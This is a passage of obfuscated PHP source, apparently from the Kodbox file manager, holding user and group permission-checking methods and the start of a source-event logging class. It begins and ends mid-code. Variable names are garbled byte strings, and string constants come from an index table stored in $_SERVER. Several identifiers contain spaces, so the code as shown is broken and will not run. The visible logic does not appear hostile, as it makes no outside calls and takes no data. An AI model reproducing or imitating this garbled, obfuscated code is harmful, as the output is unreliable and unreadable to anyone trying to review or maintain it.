ô->sourceInfo($ğ™¶¯íˆ[0]); } if (!$×­ÉÅ×û) { $í‹âó–„ = array($éğô×Èû[493] => array($éğô×Èû[494], $ğ™¶¯íˆ)); $×­ÉÅ×û = $§Æ²å ô->field($éğô×Èû[2180])->where($í‹âó–„)->select(); $×­ÉÅ×û = array_to_keyvalue($×­ÉÅ×û, $éğô×Èû[193]); } $åÍÈ»â¢ = $ğ™¶¯íˆ; foreach ($×­ÉÅ×û as $ôİïæóÄ => $ÍÑ·Ü«“) { $ğ¢‚«ÍÏ = $§Æ²å ô->parentLevelArray($ÍÑ·Ü«“[$éğô×Èû[588]]); $åÍÈ»â¢ = array_merge($åÍÈ»â¢, array($ôİïæóÄ), array_reverse($ğ¢‚«ÍÏ)); } $åÍÈ»â¢ = array_values(array_unique($åÍÈ»â¢)); if (!$åÍÈ»â¢) { return array(); } $î…ú÷¼ì = $this->sourceAuthSelect($åÍÈ»â¢); $÷‚ óÔ– = array(); foreach ($åÍÈ»â¢ as $ÁüõŒËù) { if (isset($î…ú÷¼ì[$ÁüõŒËù])) { $÷‚ óÔ–[$ÁüõŒËù] = $î…ú÷¼ì[$ÁüõŒËù]; } } $é‘ãŠã = $this->userIsRoot($©¯ØØï); $ÎÀ—µà = AuthModel::authAll(); $Û¡ªÌ¤º = array($éğô×Èû[490] => $ÎÀ—µà, $éğô×Èû[2181] => array($éğô×Èû[495] => 0, $éğô×Èû[1990] => $ÎÀ—µà, $éğô×Èû[496] => LNG($éğô×Èû[2182]), $éğô×Èû[2007] => $éğô×Èû[2183])); $ª†±õ‡ = array(); foreach ($×­ÉÅ×û as $ÁüõŒËù => $®‘€ãï) { if ($é‘ãŠã && $GLOBALS[$éğô×Èû[6]][$éğô×Èû[2003]]) { $ª†±õ‡[$ÁüõŒËù] = $Û¡ªÌ¤º; continue; } $ª†±õ‡[$ÁüõŒËù] = $this->makeSourceAuth($®‘€ãï, $÷‚ óÔ–, $©¯ØØï); } return $ª†±õ‡; } public function authDeepCheck($ ãŠ„şØ, $òêó†›ï = false) { $Ğ»úèñ³ =& $_SERVER[†ûãı«°]; $òêó†›ï = $òêó†›ï ? $òêó†›ï : USER_ID; $é—†ó¯Ÿ = $this->makeAuthDeep($òêó†›ï); if (!in_array($ ãŠ„şØ, $é—†ó¯Ÿ[$Ğ»úèñ³[2184]])) { return !1; } $šˆ‡ìÎ = array(); foreach ($é—†ó¯Ÿ[$Ğ»úèñ³[2185]] as $ÃÏà®İ => $è”Ç‰ô™) { if (!in_array($ ãŠ„şØ, $è”Ç‰ô™)) { continue; } $šˆ‡ìÎ[] = $ÃÏà®İ; } if (!$šˆ‡ìÎ) { return !1; } $ÔóÑİûÍ = $šˆ‡ìÎ ? $šˆ‡ìÎ[0] : $ ãŠ„şØ; return array($Ğ»úèñ³[490] => -1, $Ğ»úèñ³[544] => array($Ğ»úèñ³[495] => $Ğ»úèñ³[1284], $Ğ»úèñ³[1990] => $Ğ»úèñ³[230], $Ğ»úèñ³[496] => LNG($Ğ»úèñ³[2186]), $Ğ»úèñ³[2007] => $Ğ»úèñ³[2187]), $Ğ»úèñ³[2188] => LNG($Ğ»úèñ³[2189]), $Ğ»úèñ³[2190] => $this->sourceAuthInfo($ÔóÑİûÍ)); } protected function makeAuthDeep($Ï”ò’¿Ê = false) { $¡€úı¸¿ =& $_SERVER[†ûãı«°]; static $û¥ç¡Ô¨ = array(); $Ï”ò’¿Ê = $Ï”ò’¿Ê ? $Ï”ò’¿Ê : USER_ID; if (isset($û¥ç¡Ô¨[$Ï”ò’¿Ê])) { return $û¥ç¡Ô¨[$Ï”ò’¿Ê]; } $«¿ãÎ˜• = Model($¡€úı¸¿[2191])->listData(); $Şºê¡ûô = array(); foreach ($«¿ãÎ˜• as $Ï‘³ı»œ) { if ($Ï‘³ı»œ[$¡€úı¸¿[489]] == 0 && $Ï‘³ı»œ[$¡€úı¸¿[2006]] == $¡€úı¸¿[91]) { $Şºê¡ûô[] = $Ï‘³ı»œ[$¡€úı¸¿[477]]; } } $³û¯Šş• = $this->userGroupParents($Ï”ò’¿Ê); $øÚìİ› = array($¡€úı¸¿[190] => SourceModel::TYPE_USER, $¡€úı¸¿[573] => $Ï”ò’¿Ê); if ($³û¯Šş•) { $øÚìİ› = array(array($¡€úı¸¿[190] => SourceModel::TYPE_USER, $¡€úı¸¿[573] => $Ï”ò’¿Ê), array($¡€úı¸¿[190] => SourceModel::TYPE_GROUP, $¡€úı¸¿[573] => array($¡€úı¸¿[494], $³û¯Šş•)), $¡€úı¸¿[1088] => $¡€úı¸¿[2086]); } $şÃıáŠ‰ = $this->field($¡€úı¸¿[2192])->where($øÚìİ›)->select(); $™––ëë© = array(); $ÇˆÅï· = array_to_keyvalue_group($şÃıáŠ‰, $¡€úı¸¿[193]); foreach ($ÇˆÅï· as $à†¥„õ => $¬ÔÇ¬İ) { $ßƒÆ‚ŒÙ = $this->authArrayCheck($¬ÔÇ¬İ, $Ï”ò’¿Ê); if ($ßƒÆ‚ŒÙ[$¡€úı¸¿[490]] > 0) { $™––ëë©[] = $à†¥„õ . $¡€úı¸¿[12]; } } if ($³û¯Šş•) { $¯Œú•å = Model($¡€úı¸¿[589]); foreach ($³û¯Šş• as $Çª©Œî) { $À›…ª‚Ó = $¯Œú•å->getInfo($Çª©Œî); if (!$À›…ª‚Ó || !is_array($À›…ª‚Ó[$¡€úı¸¿[90]])) { continue; } $™––ëë©[] = $À›…ª‚Ó[$¡€úı¸¿[90]][$¡€úı¸¿[193]]; } } $ë™³­Ş› = array(); $Œª‰÷êÛ = $³û¯Šş•; $ô†ÀÎ = Model($¡€úı¸¿[1432]); $¯Œú•å = Model($¡€úı¸¿[589]); $’î³ô‘Ì = array(); $Ÿİ«ÄÄ = array(); $À™¥Ü¬ = array(); $Ğ­Ù€ş” = array(); if ($™––ëë©) { $ù¤éŞÅÓ = $ô†ÀÎ->where(array($¡€úı¸¿[193] => array($¡€úı¸¿[494], $™––ëë©)))->select(); foreach ($ù¤éŞÅÓ as $ŸÈÜ—Õı) { if ($ŸÈÜ—Õı[$¡€úı¸¿[507]] == $¡€úı¸¿[91]) { continue; } $ñÎçŒßä = $ô†ÀÎ->parentLevelArray($ŸÈÜ—Õı[$¡€úı¸¿[588]]); $ë™³­Ş› = array_merge($ë™³­Ş›, $ñÎçŒßä); $Œª‰÷êÛ[] = $ŸÈÜ—Õı[$¡€úı¸¿[573]]; $’î³ô‘Ì[$ŸÈÜ—Õı[$¡€úı¸¿[193]]] = $ñÎçŒßä; $Ÿİ«ÄÄ[$ŸÈÜ—Õı[$¡€úı¸¿[193]]] = $ŸÈÜ—Õı[$¡€úı¸¿[573]]; } } $Œª‰÷êÛ = array_values(array_unique($Œª‰÷êÛ)); $¿é¥”ôñ = $Œª‰÷êÛ; foreach ($¿é¥”ôñ as $Çª©Œî) { $À›…ª‚Ó = $¯Œú•å->getInfo($Çª©Œî); $ñÎçŒßä = $ô†ÀÎ->parentLevelArray($À›…ª‚Ó[$¡€úı¸¿[588]]); $Œª‰÷êÛ = array_merge($Œª‰÷êÛ, $ñÎçŒßä); } $Œª‰÷êÛ = array_values(array_unique($Œª‰÷êÛ)); foreach ($Œª‰÷êÛ as $Çª©Œî) { $À›…ª‚Ó = $¯Œú•å->getInfo($Çª©Œî); $ë™³­Ş›[] = $À›…ª‚Ó[$¡€úı¸¿[90]][$¡€úı¸¿[193]]; $À™¥Ü¬[$Çª©Œî] = $À›…ª‚Ó[$¡€úı¸¿[90]][$¡€úı¸¿[193]]; $Ğ­Ù€ş”[$Çª©Œî] = $ô†ÀÎ->parentLevelArray($À›…ª‚Ó[$¡€úı¸¿[588]]); } foreach ($’î³ô‘Ì as $¯¢îæë => $œÑ×éœÆ) { $éí±ÄöÖ = $Ÿİ«ÄÄ[$¯¢îæë]; if (!$éí±ÄöÖ || !$À™¥Ü¬[$éí±ÄöÖ]) { continue; } $µ¢úğŸŠ = array(); foreach ($Ğ­Ù€ş”[$éí±ÄöÖ] as $Çª©Œî) { $µ¢úğŸŠ[] = $À™¥Ü¬[$Çª©Œî]; } $’î³ô‘Ì[$¯¢îæë] = array_merge($µ¢úğŸŠ, $œÑ×éœÆ); } $ë™³­Ş› = array_values(array_unique($ë™³­Ş›)); $±Øşøƒ¤ = array($¡€úı¸¿[2184] => $ë™³­Ş›, $¡€úı¸¿[2185] => $’î³ô‘Ì); $û¥ç¡Ô¨[$Ï”ò’¿Ê] = $±Øşøƒ¤; return $±Øşøƒ¤; } private function makeSourceAuth($ªÒ© –°, $íÓÄéı, $şõ¡‹üğ = false) { $‚íÂ¡šĞ =& $_SERVER[†ûãı«°]; $‹øØ×°ï = $‚íÂ¡šĞ[91]; $…‰›¾š = $ªÒ© –°[$‚íÂ¡šĞ[573]]; $É´úêçº = $ªÒ© –°[$‚íÂ¡šĞ[190]] == SourceModel::TYPE_GROUP; $Ê¸Úû¼ò = $É´úêçº ? $this->groupRootAuth($…‰›¾š, $şõ¡‹üğ) : !1; if ($Ê¸Úû¼ò && Model($‚íÂ¡šĞ[575])->authCheckAction($Ê¸Úû¼ò[$‚íÂ¡šĞ[489]], $‚íÂ¡šĞ[2005])) { return $this->groupAuthInfo($Ê¸Úû¼ò, $…‰›¾š); } $çë¤´ûß = Model($‚íÂ¡šĞ[1432])->parentLevelArray($ªÒ© –°[$‚íÂ¡šĞ[588]]); $çë¤´ûß = array_merge(array($ªÒ© –°[$‚íÂ¡šĞ[193]]), array_reverse($çë¤´ûß)); $ÑÙ—´¡í = !1; foreach ($çë¤´ûß as $ÇŞ´ü«½) { if (!isset($íÓÄéı[$ÇŞ´ü«½])) { continue; } $†—¤İ¥³ = $this->authMake($íÓÄéı[$ÇŞ´ü«½], $şõ¡‹üğ); if ($†—¤İ¥³[$‚íÂ¡šĞ[544]]) { $ÑÙ—´¡í = $†—¤İ¥³; break; } } if (!$É´úêçº) { return $ÑÙ—´¡í; } if (!$ÑÙ—´¡í && $Ê¸Úû¼ò) { $ÑÙ—´¡í = $this->groupAuthInfo($Ê¸Úû¼ò, $…‰›¾š); } if (!$ÑÙ—´¡í) { $É¤Ã°”Ğ = Model($‚íÂ¡šĞ[589])->getInfo($…‰›¾š); $ğì¯‹•š = explode($‚íÂ¡šĞ[50], trim($É¤Ã°”Ğ[$‚íÂ¡šĞ[588]], $‚íÂ¡šĞ[50])); $ğì¯‹•š = array_reverse($ğì¯‹•š); foreach ($ğì¯‹•š as $úµşıù) { if ($úµşıù == $‚íÂ¡šĞ[230] || $úµşıù == $‹øØ×°ï) { continue; } $ÖÈœ ê = $this->groupRootAuth($úµşıù, $şõ¡‹üğ); if (!$ÖÈœ ê) { continue; } $ÑÙ—´¡í = $this->groupAuthInfo($ÖÈœ ê, $úµşıù); break; } } if (!$ÑÙ—´¡í || $ÑÙ—´¡í[$‚íÂ¡šĞ[490]] <= 0) { $Æ°ä¡× = $this->authDeepCheck($ªÒ© –°[$‚íÂ¡šĞ[193]], $şõ¡‹üğ); if ($Æ°ä¡×) { $ÑÙ—´¡í = $Æ°ä¡×; } } return $ÑÙ—´¡í; } private function userIsRoot($‹àŸ”Øå = false) { $ş œ†šø =& $_SERVER[†ûãı«°]; if (!$‹àŸ”Øå && KodUser::isRoot()) { return !0; } $·å¼Ğ’Ñ = Model($ş œ†šø[601])->getInfo($‹àŸ”Øå); $µÈ²Ì—Ä = Model($ş œ†šø[2193])->listData($·å¼Ğ’Ñ[$ş œ†šø[2194]]); if ($µÈ²Ì—Ä && $µÈ²Ì—Ä[$ş œ†šø[579]][$ş œ†šø[2195]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Í«ô‹Ü„) { $ŠÊ›¦íğ =& $_SERVER[†ûãı«°]; $Ñ—½ïä = Model($ŠÊ›¦íğ[1432]); $µøŒ©»÷ = $Ñ—½ïä->sourceInfo($Í«ô‹Ü„); if (!$µøŒ©»÷) { return !1; } $Ñ—½ïä->groupPathDisplay($µøŒ©»÷); $ÆàÍëñ­ = array($µøŒ©»÷); $ÆàÍëñ­ = $Ñ—½ïä->_listAppendPath($ÆàÍëñ­); $µøŒ©»÷ = $ÆàÍëñ­[0]; $¥â³ÄéŠ = $µøŒ©»÷[$ŠÊ›¦íğ[586]]; if (isset($µøŒ©»÷[$ŠÊ›¦íğ[594]])) { $œ±úÉ¸ˆ = explode($ŠÊ›¦íğ[8], trim($µøŒ©»÷[$ŠÊ›¦íğ[586]], $ŠÊ›¦íğ[8])); array_shift($œ±úÉ¸ˆ); $¥â³ÄéŠ = $µøŒ©»÷[$ŠÊ›¦íğ[592]] . $ŠÊ›¦íğ[2196] . implode($ŠÊ›¦íğ[8], $œ±úÉ¸ˆ); } return array($ŠÊ›¦íğ[496] => $µøŒ©»÷[$ŠÊ›¦íğ[32]], $ŠÊ›¦íğ[87] => KodIO::make($µøŒ©»÷[$ŠÊ›¦íğ[193]]), $ŠÊ›¦íğ[2197] => $¥â³ÄéŠ); } private function groupAuthInfo($­ÛÂÇ°Ş, $×Ğ¨äˆê) { $ ©®Ä²ƒ =& $_SERVER[†ûãı«°]; $Ş¾š‡Ûˆ = Model($ ©®Ä²ƒ[589])->getInfo($×Ğ¨äˆê); return array($ ©®Ä²ƒ[2198] => intval($­ÛÂÇ°Ş[$ ©®Ä²ƒ[489]]), $ ©®Ä²ƒ[2181] => $­ÛÂÇ°Ş, $ ©®Ä²ƒ[2199] => LNG($ ©®Ä²ƒ[2200]), $ ©®Ä²ƒ[2190] => array($ ©®Ä²ƒ[496] => $Ş¾š‡Ûˆ[$ ©®Ä²ƒ[32]], $ ©®Ä²ƒ[87] => KodIO::make($Ş¾š‡Ûˆ[$ ©®Ä²ƒ[90]][$ ©®Ä²ƒ[193]]), $ ©®Ä²ƒ[2197] => $Ş¾š‡Ûˆ[$ ©®Ä²ƒ[593]])); } protected function groupRootAuth($½ƒ“¡Ùì, $š¤‹€æŞ = false) { $ø¾Õ¸Ï‘ =& $_SERVER[†ûãı«°]; $š¤‹€æŞ = $š¤‹€æŞ ? $š¤‹€æŞ : USER_ID; $òî¤Ì¬° = $š¤‹€æŞ . $ø¾Õ¸Ï‘[2201] . $½ƒ“¡Ùì; static $âÃâğŠÇ = array(); if (isset($âÃâğŠÇ[$òî¤Ì¬°])) { return $âÃâğŠÇ[$òî¤Ì¬°]; } $Ï•ÅÈóÒ = Model($ø¾Õ¸Ï‘[589])->getInfo($½ƒ“¡Ùì); $ÄÁ¢š˜° = $this->userGroupList($š¤‹€æŞ); $ÏÛ»Â®Š = isset($ÄÁ¢š˜°[$½ƒ“¡Ùì]) ? $ÄÁ¢š˜°[$½ƒ“¡Ùì][$ø¾Õ¸Ï‘[489]] : !1; if ($ÏÛ»Â®Š && Model($ø¾Õ¸Ï‘[575])->authCheckAction($ÏÛ»Â®Š[$ø¾Õ¸Ï‘[489]], $ø¾Õ¸Ï‘[2005])) { $âÃâğŠÇ[$òî¤Ì¬°] = $ÏÛ»Â®Š; return $ÏÛ»Â®Š; } $§ÅüÌ½ = $this->sourceAuthSelect($Ï•ÅÈóÒ[$ø¾Õ¸Ï‘[90]][$ø¾Õ¸Ï‘[193]]); $£ÁØ©‡ = $§ÅüÌ½ ? $this->authMake($§ÅüÌ½, $š¤‹€æŞ) : !1; $ŒçŞÈå‚ = $£ÁØ©‡ ? $£ÁØ©‡[$ø¾Õ¸Ï‘[544]] : !1; $âÃâğŠÇ[$òî¤Ì¬°] = $ŒçŞÈå‚ ? $ŒçŞÈå‚ : $ÏÛ»Â®Š; return $âÃâğŠÇ[$òî¤Ì¬°]; } public function authOwnerApply($î†àÑ—õ) { $»Óëİ€Ş =& $_SERVER[†ûãı«°]; if (empty($î†àÑ—õ[$»Óëİ€Ş[489]]) || isset($î†àÑ—õ[$»Óëİ€Ş[2202]]) && $î†àÑ—õ[$»Óëİ€Ş[2202]]) { return $î†àÑ—õ; } if (AuthModel::authCheckRoot($î†àÑ—õ[$»Óëİ€Ş[489]][$»Óëİ€Ş[490]])) { return $î†àÑ—õ; } $Èİù˜êä = Model($»Óëİ€Ş[1432])->parentLevelArray($î†àÑ—õ[$»Óëİ€Ş[588]]); $Èİù˜êä = array_merge(array($î†àÑ—õ[$»Óëİ€Ş[193]]), array_reverse($Èİù˜êä)); $†«ÂÂƒù = $this->sourceAuthSelect($Èİù˜êä); $ÎÅ§’Ö÷ = array(); $×ÇÚµ¡ô = array(); foreach ($†«ÂÂƒù as $İÒÜ³£ => $æòŞøÑ) { $Ê³§ëÖ = $this->authFolderOwnerUser($æòŞøÑ); $ÎÅ§’Ö÷[$İÒÜ³£] = $Ê³§ëÖ; $×ÇÚµ¡ô = array_merge($×ÇÚµ¡ô, $Ê³§ëÖ[$»Óëİ€Ş[669]]); if ($Ê³§ëÖ[$»Óëİ€Ş[2203]]) { break; } } if (count($×ÇÚµ¡ô) == 0) { $×ÇÚµ¡ô = $this->authFolderOwnerGroup($î†àÑ—õ[$»Óëİ€Ş[573]]); } $×ÇÚµ¡ô = array_unique($×ÇÚµ¡ô); if (AuthModel::authCheckRoot($î†àÑ—õ[$»Óëİ€Ş[489]][$»Óëİ€Ş[490]])) { $×ÇÚµ¡ô[] = USER_ID; } $î†àÑ—õ[$»Óëİ€Ş[489]][$»Óëİ€Ş[2204]] = Model($»Óëİ€Ş[581])->userListInfo($×ÇÚµ¡ô); return $î†àÑ—õ; } private function authFolderOwnerGroup($”„åßÇ¬) { $³¬“£ôÆ =& $_SERVER[†ûãı«°]; $­ªûÑ¾¼ = Model($³¬“£ôÆ[2078])->where(array($³¬“£ôÆ[1984] => $”„åßÇ¬))->select(); $£òÊòÕ­ = array(); if (!$­ªûÑ¾¼) { return $£òÊòÕ­; } foreach ($­ªûÑ¾¼ as $ ×˜áÉ³) { $†Ëå•Àš = $this->authInfo($ ×˜áÉ³); if (AuthModel::authCheckRoot($†Ëå•Àš[$³¬“£ôÆ[489]])) { $£òÊòÕ­[] = $ ×˜áÉ³[$³¬“£ôÆ[1783]]; } } return $£òÊòÕ­; } private function authFolderOwnerUser($’ØÊØ´¢) { $ªÔÙ › =& $_SERVER[†ûãı«°]; $¿ÜÄÄ³™ = array(); $úÂÉÅ½ = !1; foreach ($’ØÊØ´¢ as $äí¼ò²¥) { $¸½„ıê = $this->authInfo($äí¼ò²¥); if ($äí¼ò²¥[$ªÔÙ ›[573]] == $ªÔÙ ›[230]) { $úÂÉÅ½ = !0; } if ($äí¼ò²¥[$ªÔÙ ›[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¸½„ıê[$ªÔÙ ›[489]])) { $¿ÜÄÄ³™[] = $äí¼ò²¥[$ªÔÙ ›[573]]; } } } return array($ªÔÙ ›[669] => $¿ÜÄÄ³™, $ªÔÙ ›[2203] => $úÂÉÅ½); } public function authMake($òô§ü±, $Òê¬íñŸ = false) { $¥¹È›ö  =& $_SERVER[†ûãı«°]; $Ç³›±ı” = $this->authArrayCheck($òô§ü±, $Òê¬íñŸ); if ($Ç³›±ı”[$¥¹È›ö [2205]]) { $Ç³›±ı”[$¥¹È›ö [2205]] = $this->sourceAuthInfo($Ç³›±ı”[$¥¹È›ö [2205]]); } return $Ç³›±ı”; } public function authArrayCheck($ïÖÛÖ­‚, $•™°™»¿ = false) { $Šˆ´¼ˆÚ =& $_SERVER[†ûãı«°]; if (!$ïÖÛÖ­‚) { return array($Šˆ´¼ˆÚ[490] => 0, $Šˆ´¼ˆÚ[544] => !1); } $•™°™»¿ = $•™°™»¿ ? $•™°™»¿ : USER_ID; $ñÛı—Ç = 0; $è‘¿œÖ = 0; $¹¨ÎŞ›Æ = 0; $ºõí—‹á = 0; $íğşã½æ = 0; $û¹½ËèÎ = 0; $¡×ØŞš = 1000; $ˆôÖËÌ‹ = 0; $ÒÒ–Ùì = 0; $ëÇÎÕÃÔ = 0; $÷”™œÛÚ = 0; $Ñ½£Çú = array($Šˆ´¼ˆÚ[193] => 0); foreach ($ïÖÛÖ­‚ as $Ñ½£Çú) { $Ú“¥Ô¨¢ = $this->authInfo($Ñ½£Çú); if (!$Ú“¥Ô¨¢) { continue; } $÷«’İ·´ = $Ñ½£Çú[$Šˆ´¼ˆÚ[573]]; $‚ËŒ²ñ = intval($Ú“¥Ô¨¢[$Šˆ´¼ˆÚ[489]]); if ($Ñ½£Çú[$Šˆ´¼ˆÚ[190]] == SourceModel::TYPE_USER && $÷«’İ·´ == $•™°™»¿) { $ñÛı—Ç = !0; $¹¨ÎŞ›Æ = $Ú“¥Ô¨¢; $è‘¿œÖ = $‚ËŒ²ñ; } else { if ($Ñ½£Çú[$Šˆ´¼ˆÚ[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($÷«’İ·´, $•™°™»¿)) { $ºõí—‹á = !0; $ÆÑœò¢è = $this->groupStepToUserGroup($÷«’İ·´, $•™°™»¿); if ($ÆÑœò¢è < $¡×ØŞš) { $¡×ØŞš = $ÆÑœò¢è; $íğşã½æ = $‚ËŒ²ñ; $û¹½ËèÎ = $Ú“¥Ô¨¢; $ˆôÖËÌ‹ = $÷«’İ·´; } if ($ÆÑœò¢è == $¡×ØŞš && $‚ËŒ²ñ >= $íğşã½æ) { $íğşã½æ = $‚ËŒ²ñ; $û¹½ËèÎ = $Ú“¥Ô¨¢; $ˆôÖËÌ‹ = $÷«’İ·´; } } else { if ($÷«’İ·´ == $Šˆ´¼ˆÚ[230]) { $ÒÒ–Ùì = !0; $÷”™œÛÚ = $Ú“¥Ô¨¢; $ëÇÎÕÃÔ = $‚ËŒ²ñ; } } } } if ($ñÛı—Ç) { $´Ç©â³­ = $è‘¿œÖ; $Ú“¥Ô¨¢ = $¹¨ÎŞ›Æ; $ÂŞÁÊÖå = LNG($Šˆ´¼ˆÚ[2206]); } else { if ($ºõí—‹á) { $´Ç©â³­ = $íğşã½æ; $Ú“¥Ô¨¢ = $û¹½ËèÎ; $ºå¿ºã¿ = Model($Šˆ´¼ˆÚ[589])->getInfo($ˆôÖËÌ‹); $ÂŞÁÊÖå = $Šˆ´¼ˆÚ[176] . $ºå¿ºã¿[$Šˆ´¼ˆÚ[593]] . $Šˆ´¼ˆÚ[2207] . LNG($Šˆ´¼ˆÚ[2208]); } else { if ($ÒÒ–Ùì) { $´Ç©â³­ = $ëÇÎÕÃÔ; $Ú“¥Ô¨¢ = $÷”™œÛÚ; $ÂŞÁÊÖå = LNG($Šˆ´¼ˆÚ[2178]); } else { $´Ç©â³­ = 0; $Ú“¥Ô¨¢ = !1; $ÂŞÁÊÖå = $Šˆ´¼ˆÚ[12]; } } } $õÄÒƒ˜› = array($Šˆ´¼ˆÚ[2198] => intval($´Ç©â³­), $Šˆ´¼ˆÚ[2181] => $Ú“¥Ô¨¢, $Šˆ´¼ˆÚ[2199] => $ÂŞÁÊÖå, $Šˆ´¼ˆÚ[2190] => $Ñ½£Çú[$Šˆ´¼ˆÚ[193]]); return $õÄÒƒ˜›; } private function groupContainUser($·Ô°À¶ˆ, $ØúÇÉîİ = false) { return in_array($·Ô°À¶ˆ, $this->userGroupParents($ØúÇÉîİ)); } private function groupStepToUserGroup($Éœ¨™, $‡å—ş­¢ = false) { $€ÁÛŒûë =& $_SERVER[†ûãı«°]; $ë ŒŸÁ = $this->userGroupList($‡å—ş­¢); $ñ©ÃÀÄè = 1000; $›¤Ö–è‹ = $GLOBALS[$€ÁÛŒûë[6]][$€ÁÛŒûë[92]][$€ÁÛŒûë[2091]] == 1; $å„ŞÒ¯ = $›¤Ö–è‹ ? 3 : 2; foreach ($ë ŒŸÁ as $†¨·­®Ò) { if ($†¨·­®Ò[$€ÁÛŒûë[1984]] == $Éœ¨™) { return 0; } $Ğ”ŒŞù  = explode($€ÁÛŒûë[50], trim($†¨·­®Ò[$€ÁÛŒûë[588]], $€ÁÛŒûë[50])); if ($Ğ”ŒŞù [0] == $€ÁÛŒûë[230] && count($Ğ”ŒŞù ) > $å„ŞÒ¯) { $ÏŸºóí  = array_reverse(array_slice($Ğ”ŒŞù , $å„ŞÒ¯)); $Çè»Šêê = array_search($Éœ¨™, $ÏŸºóí ); if ($Çè»Šêê !== !1 && $Çè»Šêê + 1 <= $ñ©ÃÀÄè) { $ñ©ÃÀÄè = $Çè»Šêê + 1; } } } return $ñ©ÃÀÄè; } private function userGroupList($‚ÒË×âÚ = false) { $ªÍ—šÙ’ =& $_SERVER[†ûãı«°]; static $ÖïÀˆª´ = array(); if (isset($ÖïÀˆª´[$‚ÒË×âÚ])) { return $ÖïÀˆª´[$‚ÒË×âÚ]; } $àâÆÇ³Æ = Model($ªÍ—šÙ’[601])->getInfo($‚ÒË×âÚ); $ÖïÀˆª´[$‚ÒË×âÚ] = array_to_keyvalue($àâÆÇ³Æ[$ªÍ—šÙ’[2179]], $ªÍ—šÙ’[1984]); return $ÖïÀˆª´[$‚ÒË×âÚ]; } public function userGroupParents($¨¸À±õÕ) { $õ†£¶¯× =& $_SERVER[†ûãı«°]; static $¨µÊ Û› = array(); $¨¸À±õÕ = $¨¸À±õÕ ? $¨¸À±õÕ : USER_ID; if (isset($¨µÊ Û›[$¨¸À±õÕ])) { return $¨µÊ Û›[$¨¸À±õÕ]; } $°éŒÙ¸– = $this->userGroupList($¨¸À±õÕ); $éêËÉ€ = array(); $ç•Õ°Ç• = $GLOBALS[$õ†£¶¯×[6]][$õ†£¶¯×[92]][$õ†£¶¯×[2091]] == 1; $øéÄµ ´ = $ç•Õ°Ç• ? 3 : 2; foreach ($°éŒÙ¸– as $ùìíÉë™) { $ÙñÁ”¾Û = array($ùìíÉë™[$õ†£¶¯×[1984]]); $÷´Ã¦¢ü = explode($õ†£¶¯×[50], trim($ùìíÉë™[$õ†£¶¯×[588]], $õ†£¶¯×[50])); if ($÷´Ã¦¢ü[0] == $õ†£¶¯×[230] && count($÷´Ã¦¢ü) > $øéÄµ ´) { $ğ¬àÍ…— = array_slice($÷´Ã¦¢ü, $øéÄµ ´); $ÙñÁ”¾Û = array_merge($ÙñÁ”¾Û, array_reverse($ğ¬àÍ…—)); } $éêËÉ€ = array_merge($éêËÉ€, $ÙñÁ”¾Û); } $¨µÊ Û›[$¨¸À±õÕ] = array_unique($éêËÉ€); return $¨µÊ Û›[$¨¸À±õÕ]; } public function authTargetInfoMake($”‡ÏÜĞÒ) { $·Ç”ÆÖÒ =& $_SERVER[†ûãı«°]; $İâ–±š = array(); $È×•„ï = array(); foreach ($”‡ÏÜĞÒ as $¯Â”•Ó¿) { if ($¯Â”•Ó¿[$·Ç”ÆÖÒ[190]] == SourceModel::TYPE_USER) { $İâ–±š[] = intval($¯Â”•Ó¿[$·Ç”ÆÖÒ[573]]); } else { if ($¯Â”•Ó¿[$·Ç”ÆÖÒ[190]] == SourceModel::TYPE_GROUP) { $È×•„ï[] = intval($¯Â”•Ó¿[$·Ç”ÆÖÒ[573]]); } } } if ($İâ–±š) { $İâ–±š = Model($·Ç”ÆÖÒ[581])->userListInfo($İâ–±š); } if ($È×•„ï) { $Ü²ÜÚ®« = array($·Ç”ÆÖÒ[2076] => array($·Ç”ÆÖÒ[494], $È×•„ï)); $È×•„ï = Model($·Ç”ÆÖÒ[589])->field($·Ç”ÆÖÒ[2209])->where($Ü²ÜÚ®«)->select(); $È×•„ï = array_to_keyvalue($È×•„ï, $·Ç”ÆÖÒ[1984]); } return array($·Ç”ÆÖÒ[2210] => $İâ–±š, $·Ç”ÆÖÒ[2211] => $È×•„ï); } public function authInfo($İàŠÎÒ¶) { $§üÈæ‰ù =& $_SERVER[†ûãı«°]; if ($İàŠÎÒ¶[$§üÈæ‰ù[2092]]) { $á–©ÙÀú = Model($§üÈæ‰ù[575])->listData($İàŠÎÒ¶[$§üÈæ‰ù[2092]]); if (!$á–©ÙÀú) { return !1; $¶ÛŞ–å¹ = Model($§üÈæ‰ù[575])->listData(); $ı‹ÙòŞ = array_filter_by_field($¶ÛŞ–å¹, $§üÈæ‰ù[489], $§üÈæ‰ù[230]); return $ı‹ÙòŞ; } $Şå¹î‡“ = array_field_key($á–©ÙÀú, array($§üÈæ‰ù[477], $§üÈæ‰ù[32], $§üÈæ‰ù[489], $§üÈæ‰ù[2007], $§üÈæ‰ù[2008])); $Şå¹î‡“[$§üÈæ‰ù[2212]] = $İàŠÎÒ¶; return $Şå¹î‡“; } else { return array($§üÈæ‰ù[495] => 0, $§üÈæ‰ù[1990] => $İàŠÎÒ¶[$§üÈæ‰ù[2156]], $§üÈæ‰ù[496] => $§üÈæ‰ù[12], $§üÈæ‰ù[2007] => $§üÈæ‰ù[2213]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\162\143\x65\x5f\145\x76\145\156\164"; protected $dataAuto = array(array("\x63\162\145\141\164\145\x54\151\x6d\x65", "\x74\x69\x6d\145", "\151\156\x73\x65\x72\164", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\144\145\x73\143", '', "\151\156\163\x65\162\x74\x2c\165\x70\144\141\x74\x65\x2c\x73\145\154\145\x63\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ıºùÕ×¤, $ÖøÍ¡»¦, $ˆ¡Âš™… = '') { $¾è¶­å =& $_SERVER[†ûãı«°]; if (!$this->eventSave) { return; } $ÜÍ½½ = Model($¾è¶­å[1432])->sourceInfo($ıºùÕ×¤); if (!$ÜÍ½½) { return !1; } if ($this->isDisableEvent($ÜÍ½½, $ÖøÍ¡»¦)) { return; } if ($ˆ¡Âš™… && is_string($ˆ¡Âš™…)) { $ˆ¡Âš™… = array($¾è¶­å[2023] => $ˆ¡Âš™…); } $Õ·±ª¹½ = defined($¾è¶­å[2214]) ? USER_ID : 0; $¦ğå = array($¾è¶­å[493] 